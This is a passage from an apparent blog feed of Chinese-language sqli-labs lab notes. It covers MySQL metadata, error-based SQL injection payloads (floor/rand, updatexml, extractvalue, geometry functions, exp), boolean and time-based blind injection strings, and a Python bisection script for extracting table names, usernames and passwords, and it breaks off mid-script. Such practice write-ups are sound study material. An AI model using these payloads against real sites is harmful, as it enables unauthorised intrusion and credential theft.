class="string">&#x27;challenges&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br><span class="line">信息</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select 字段名 from challenges.表),floor(rand()*2)) as a from information_schema.tables group by a--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="Less59：GET-双查询-每轮允许5次-2"><a href="#Less59：GET-双查询-每轮允许5次-2" class="headerlink" title="Less59：GET-双查询-每轮允许5次-2"></a>Less59：GET-双查询-每轮允许5次-2</h3><p>为数字型注入，同58类似</p><h3 id="Less60：GET-双查询-每轮允许5次-3"><a href="#Less60：GET-双查询-每轮允许5次-3" class="headerlink" title="Less60：GET-双查询-每轮允许5次-3"></a>Less60：GET-双查询-每轮允许5次-3</h3><p>带括号的双引号字符型注入，参考58</p><h3 id="Less61：GET-双查询-每轮允许5次-4"><a href="#Less61：GET-双查询-每轮允许5次-4" class="headerlink" title="Less61：GET-双查询-每轮允许5次-4"></a>Less61：GET-双查询-每轮允许5次-4</h3><p>带两个小括号的单引号字符型，参考58</p><h3 id="Less62：GET-盲注-每轮允许130次-1"><a href="#Less62：GET-盲注-每轮允许130次-1" class="headerlink" title="Less62：GET-盲注-每轮允许130次-1"></a>Less62：GET-盲注-每轮允许130次-1</h3><p> 字符型单引号加小括号闭合，没有报错回显信息，无法利用报错注入，</p><p><code>?id=1&#39;) union select 1,2,3-- #</code> 无法有效的回显我们需要的信息，也就是说无法进行union联合注入，那么我们只能进行盲注了,参考Less-8，利用二分法进行布尔盲注</p><h3 id="Less63：GET-盲注-每轮允许130次-2"><a href="#Less63：GET-盲注-每轮允许130次-2" class="headerlink" title="Less63：GET-盲注-每轮允许130次-2"></a>Less63：GET-盲注-每轮允许130次-2</h3><p><code>&#39;</code>闭合,其他一样</p><h3 id="Less64：GET-盲注-每轮允许130次-3"><a href="#Less64：GET-盲注-每轮允许130次-3" class="headerlink" title="Less64：GET-盲注-每轮允许130次-3"></a>Less64：GET-盲注-每轮允许130次-3</h3><p><code>1))</code>闭合，其他一样</p><h3 id="Less65GET-盲注-每轮允许130次-4"><a href="#Less65GET-盲注-每轮允许130次-4" class="headerlink" title="Less65GET-盲注-每轮允许130次-4"></a>Less65GET-盲注-每轮允许130次-4</h3><p><code>&quot;)</code>闭合，其他一样</p><p>后面的关卡没有源码了。。。</p><p>参考：<a href="https://blog.csdn.net/weixin_39934520/article/list/8">https://blog.csdn.net/weixin_39934520/article/list/8</a></p><p>里面很多tips我没有考虑到</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs记录1</title>
      <link href="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/"/>
      <url>/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<p>本文记录一下sqli-labs第1-22关注入学习的过程。</p><span id="more"></span><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><h3 id="1-information-schema"><a href="#1-information-schema" class="headerlink" title="1.information_schema"></a>1.information_schema</h3><p><img src="image-20210216142604439.png" alt="image-20210216142604439"></p><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。把mysql数据库看作一本书，则它相当于mysql数据库的目录。</p><p>我们经常在注入时结合information_schema来爆数据库、表、字段等等。介绍几个常用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">information_schema.schemata所有数据库名，show databases()的结果就是取自于此；</span><br><span class="line">schema_name数据库名，schemata属性，跟show databases()显示出来的一样；</span><br><span class="line">information_schema.tables所有表的信息</span><br><span class="line">table_name表的名称，table属性</span><br><span class="line">table_schema数据库名，table属性</span><br><span class="line">information_schema.columns表示所有列的信息</span><br><span class="line">table_name表的名称，columns属性</span><br><span class="line">column_name列的名称，columns属性</span><br><span class="line">table_schema数据库名，columns属性</span><br></pre></td></tr></table></figure><p><strong>栗子</strong></p><p>1.查询所有数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure><p>2.查询数据表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;&quot;</span><br></pre></td></tr></table></figure><p>3.查询字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&quot;&quot;</span><br></pre></td></tr></table></figure><p>4.查询数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=-1 union select 1,group_concat(username,&quot; &quot;,password) from  table_name</span><br></pre></td></tr></table></figure><h3 id="2-基础函数"><a href="#2-基础函数" class="headerlink" title="2.基础函数"></a>2.基础函数</h3><h4 id="1-系统函数"><a href="#1-系统函数" class="headerlink" title="1.系统函数"></a>1.系统函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()——MySQL 版本</span><br><span class="line">user()——数据库用户名</span><br><span class="line">database()——数据库名</span><br><span class="line">@@datadir——数据库路径</span><br><span class="line">@@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure><p>user()可能为以下情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:表本地  </span><br><span class="line">root@%：表任意主机  </span><br><span class="line">root@127.0.0.1：表指定IP  </span><br></pre></td></tr></table></figure><h4 id="2-union"><a href="#2-union" class="headerlink" title="2.union"></a>2.union</h4><p>用于将不同表中相同列中查询的数据展示出来，不包括重复数据。但是UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型。同时每条 SELECT 语句中的 列的顺序必须相同。若要重复值也显示出来，则使用<code>UNION ALL</code></p><h4 id="3-字符串连接函数"><a href="#3-字符串连接函数" class="headerlink" title="3.字符串连接函数"></a>3.字符串连接函数</h4><h5 id="1-concat-str1-str2-…"><a href="#1-concat-str1-str2-…" class="headerlink" title="1.concat(str1,str2,…)"></a>1.<strong>concat(str1,str2,…)</strong></h5><p>没有分隔符地连接字符串.返回结果为连接参数产生的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如有任何一个参数为NULL ，则返回值为 NULL。如果所有参数均为非二进制字符串，则结果为非二进制字符串。 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串。若要避免一个数字参数被转化为与之相等的二进制字符串格式,可使用显式类型 cast, 例如： `SELECT CONCAT(CAST(int_col AS CHAR), char_col)`</span><br></pre></td></tr></table></figure><p>另外虽然没有分隔符连接字符串，但还是试验时可以使用分隔符：<code>concat(id,&#39;|&#39;,pwd,&#39;|&#39;,repwd)</code>：|为分割符,可为任意分隔符。</p><h5 id="2-concat-ws-‘separator’-str1-str2-…"><a href="#2-concat-ws-‘separator’-str1-str2-…" class="headerlink" title="2.concat_ws(‘separator’,str1,str2,…)"></a>2.<strong>concat_ws(‘separator’,str1,str2,…)</strong></h5><p>全称<code>CONCAT With Separator</code>,含有分隔符地连接字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值，不会忽略任何空字符串。</span><br></pre></td></tr></table></figure><h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat()"></a>3.<strong>group_concat()</strong></h5><p>返回要连接的字段的一个集合</p><p><code>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code></p><p>当只有一个参数时，默认连接分隔符是”,“</p><h4 id="4-用于盲注的函数"><a href="#4-用于盲注的函数" class="headerlink" title="4.用于盲注的函数"></a>4.用于盲注的函数</h4><p><strong>floor()</strong></p><p>说明：向下取整。floor(1)&#x3D;floor(1.2)&#x3D;1</p><p><strong>rand()</strong></p><p>说明：在0和1之间产生一个随机数。rand(0)*2将取0到2的随机数，并不是执行两次随机数。rand不能和order by一起使用</p><p><strong>if()</strong></p><p>说明：<code>if(expr1,expr2,expr3)</code>含义是如果expr1是True,则返回expr2,否则返回expr3。多用于时间盲注。</p><p><strong>length()</strong></p><p>说明：返回字符串的长度</p><p><strong>count()</strong></p><p>说明：用来统计记录的数量。其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。</p><p><strong>left(a,b)</strong></p><p>说明：database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</p><p>举例：<code>left(database(),1)&gt;’s’ </code></p><p><strong>Ascii()</strong></p><p>说明：Ascii()将某个字符转换 为 ascii 值</p><p><strong>substr(a,b,c)</strong></p><p>说明：从 b 位置开始，截取字符串 a 的 c 长度。</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 --+ </span><br></pre></td></tr></table></figure><p><strong>mid(a,b,c)</strong></p><p>说明：从位置 b 开始，截取 a 字符串的 c 位 </p><p><strong>ord()</strong></p><p>说明：Ord()函数同 ascii()，将字符转为 ascii 值</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</span><br></pre></td></tr></table></figure><p><strong>sleep()</strong></p><p>说明：<code>sleep(n)</code>将程序挂起n秒后执行。多用于时间盲注。</p><p><strong>BENCHMARK()</strong></p><p>说明：BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 <strong>sleep()</strong></p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</span><br></pre></td></tr></table></figure><h3 id="3-常见注入"><a href="#3-常见注入" class="headerlink" title="3.常见注入"></a>3.常见注入</h3><h4 id="1-十种报错注入"><a href="#1-十种报错注入" class="headerlink" title="1.十种报错注入"></a>1.十种报错注入</h4><p>sql语句错误时，web页面会报错，有的会输出后台数据库错误语句。</p><h5 id="1-双查询注入报错-floor-报错"><a href="#1-双查询注入报错-floor-报错" class="headerlink" title="1.双查询注入报错-floor()报错"></a>1.双查询注入报错-floor()报错</h5><p>固定套路：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;:&#x27;</span>,([子查询],<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))) <span class="keyword">as</span> a form [table_name] <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">理论上每次都有百分之<span class="number">50</span>的可能性成功报错</span><br><span class="line">可以替换为以下（不过没试验过。。）</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(), <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br><span class="line">如果关键的表被禁用了，可以使用这种形式 </span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">!</span><span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br><span class="line">如果 rand 被禁用了可以使用用户变量来报错</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(password,<span class="variable">@a</span>:<span class="operator">=</span>(<span class="variable">@a</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">%</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>原理</strong>：通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是<code>floor(random(0)*2)</code>的不确定性，即可能为0也可能为1,<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行和不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。正确结果与报错信息一起输出。</p><p>关于key：<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。</p><p>原理来自：<a href="https://www.cnblogs.com/BloodZero/p/4660971.html">https://www.cnblogs.com/BloodZero/p/4660971.html</a></p><h5 id="2-updatexml和extractvalue"><a href="#2-updatexml和extractvalue" class="headerlink" title="2.updatexml和extractvalue"></a>2.updatexml和extractvalue</h5><p><strong>updatexml</strong></p><p>UPDATEXML (XML_document, XPath_string, new_value); </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p>用法，最大长度限制32位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>解释</p><p>由于updatexml的第二个参数需要Xpath格式的字符串，以0x7e开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p><p><strong>extractvalue</strong></p><p>updatexml是修改的。而evtractvalue是查询的。从目标XML中返回包含所查询值的字符串。</p><p>EXTRACTVALUE (XML_document, XPath_string);</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">　　第二个参数：XPath_string (Xpath格式的字符串)</span><br></pre></td></tr></table></figure><p>用法：最大长度限制32位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>解释</p><p>依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p><h5 id="3-有关画图的七类"><a href="#3-有关画图的七类" class="headerlink" title="3.有关画图的七类"></a>3.有关画图的七类</h5><p>差不多都是和画图有关的，共同点是传入非正常参数导致报错和查询嵌套导致报错，所以我把它归为一类。</p><p><strong>geometrycollection()</strong></p><p>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POINT(x,y) 函数,这是坐标函数，相当于X,Y坐标图上的一点。</span><br><span class="line">LINESTRING(x y,x y)函数,这个函数用来描述直线,两点连成的直线。</span><br></pre></td></tr></table></figure><p>利用条件：5.5&lt;version()&lt;5.6</p><p>用法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p>解释</p><p>由于MYSQL无法用这样字符串画出图形,所以报错了</p><p><strong>multipoint()</strong></p><p>　MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。</p><p>用法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p>MultiPoint（）函数中是需要数字的，没有就报错了。。。</p><p><strong>polygon()</strong></p><p>在地区地图上，Polygon对象可表示森林、区等。</p><p>用法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p>解释：</p><p>需要数字的，没有就报错了。。。</p><p><strong>multipolygon()</strong></p><p>　multipolygon()是一种由Polygon元素构成的几何对象集合。</p><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><p>解释：</p><p>　multipolygon()需要的是Polygon元素。为了显错传入字符串,所以报错。</p><p><strong>linestring()</strong></p><p>LineString()是具有点之间线性内插特性的Curve.</p><p>用法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p>解释：</p><p>LineString(1 1,2 2) 这是它的用法。为了显错传入了,字符串….</p><p><strong>multilinestring()</strong></p><p>multilinestring()是一种由LineStirng元素构成的MultiCurve几何对象集合。</p><p>用法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p>解释：</p><p>MULTILINESTRING((10 10, 20 20), (15 15, 30 15))这样用的。为了显错又把字符串传进去了。</p><p><strong>exp()</strong></p><p>EXP(x)函数计算e的x次方，即ex。</p><p>用法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure><p>解释</p><p>　EXP()肯定是需要数字的,传入个字符串必然显错</p><h4 id="2-盲注"><a href="#2-盲注" class="headerlink" title="2.盲注"></a>2.盲注</h4><p>blind sql是注入攻击的一种，向数据库发送true或false的问题，并根据应用返回的信息判断结果。这种攻击的出现是因为应用程序只显示常规错误，但并没有解决sql注入存在的代码问题。</p><p>进行常规sql注入时，web界面会返回后端数据库执行sql查询返回的错误信息，盲注与常规注入相似，但是不同的是数据库返回的数据的检索方式，若数据库没有输出数据到web页面，攻击者会询问一些列的true或false问题，强制从数据库获取数据。</p><p>在有些情况下，后台使用了错误信息屏蔽方式(比如@)屏蔽了报错，此时无法根据报错信息来进行判断注入。</p><p>从安全角度讲，后台数据库返回错误提示，这给构造闭合语句的人提供了便利，为了解决这一安全问题，除了在后台设置相应的语句判断机制外，不提供对应的错误返回提示，或无论在什么情况下都提供相同的错误返回提示确实是一种降低渗透风险的方法。而盲注就是在后台不提供返回提示的情况下构造payload的方法，其实它本身也还是一种注入方式。</p><h5 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1.布尔盲注"></a>1.布尔盲注</h5><p>即基于真假的盲注。主要有以下几种表现情况</p><p>1.<strong>没有报错信息</strong></p><p>2.不管正确的输入，还是错误的输入，都只显示<strong>两种情况</strong>(我们可以默认为0和1)</p><p>3.在正确的输入下，输入and1&#x3D;1，and1&#x3D;2发现可以判断返回结果信息</p><p>常使用以下语句猜解字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url?var=-1[&#x27; | &quot; | ) | &#x27;) | &quot;) ...] select length(database()) --+</span><br><span class="line">           </span><br><span class="line">url?var=-1[&#x27; | &quot; | ) | &#x27;) | &quot;) ...] select substr(database(),1,1) --+</span><br><span class="line">           </span><br><span class="line">url?var=-1[&#x27; | &quot; | ) | &#x27;) | &quot;) ...] select ascii(substr(database(),1,1)) --+</span><br><span class="line"></span><br><span class="line">url?var=1[&#x27; | &quot; | ) | &#x27;) | &quot;) ...] and ascii(substr(database(),1,1)) &gt; | &lt; | = N --+</span><br></pre></td></tr></table></figure><p>一般来说<strong>二分法脚本</strong>如下：(来源于<a href="https://y4tacker.blog.csdn.net/">Y4tacker</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url?id=1[&#x27; | &quot;</span> | ) | <span class="string">&#x27;) | &quot;) ...] and 1=&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">result = &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    i = i + 1</span></span><br><span class="line"><span class="string">    head = 32</span></span><br><span class="line"><span class="string">    tail = 127</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    while head &lt; tail:</span></span><br><span class="line"><span class="string">        mid = (head + tail) &gt;&gt; 1 #中值</span></span><br><span class="line"><span class="string">        # payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr(database(),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,<span class="number">0</span>)--+<span class="string">&#x27; #爆当前数据库</span></span><br><span class="line"><span class="string">        # payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,<span class="number">0</span>)--+<span class="string">&#x27; #爆当前数据库所有的表</span></span><br><span class="line"><span class="string">        # payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;users&quot;</span>),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,<span class="number">0</span>)--+<span class="string">&#x27; #爆当前表的所有字段</span></span><br><span class="line"><span class="string">        # payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr((select group_concat(username) <span class="keyword">from</span> users),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,<span class="number">0</span>)--+<span class="string">&#x27;#爆用户名</span></span><br><span class="line"><span class="string">        # payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr((select group_concat(password) <span class="keyword">from</span> users),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,<span class="number">0</span>)--+<span class="string">&#x27; #爆密码</span></span><br><span class="line"><span class="string">        r = requests.get[ | POST ](url + payload, timeout=2)</span></span><br><span class="line"><span class="string">        if &#x27;</span>屏幕回显<span class="string">&#x27; in r.text:</span></span><br><span class="line"><span class="string">            head = mid + 1</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            tail = mid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if head != 32:</span></span><br><span class="line"><span class="string">        result += chr(head)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">print(result)</span></span><br></pre></td></tr></table></figure><p><strong>有时候屏幕回显很大一部分不好掌握，建议使用时间盲注。</strong></p><p>也可用burp进行爆破，但是步骤太多，太麻烦了。。</p><h5 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.时间盲注"></a>2.时间盲注</h5><p>由于<strong>注入点无法反馈信息</strong>，所以不能像其他注入方式那样直接简洁的获取信息，需要从侧面一步步拼凑出信息。</p><p> 常使用以下语句猜解字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url?var=1[&#x27; | &quot; | ) | &#x27;) | &quot;) ...] and if(1=0,1, sleep(10)) --+ </span><br><span class="line">          </span><br><span class="line">url?var=-1[&#x27; | &quot; | ) | &#x27;) | &quot;) ...] union select if(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1 --+</span><br></pre></td></tr></table></figure><p>一般来说<strong>二分法脚本</strong>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span 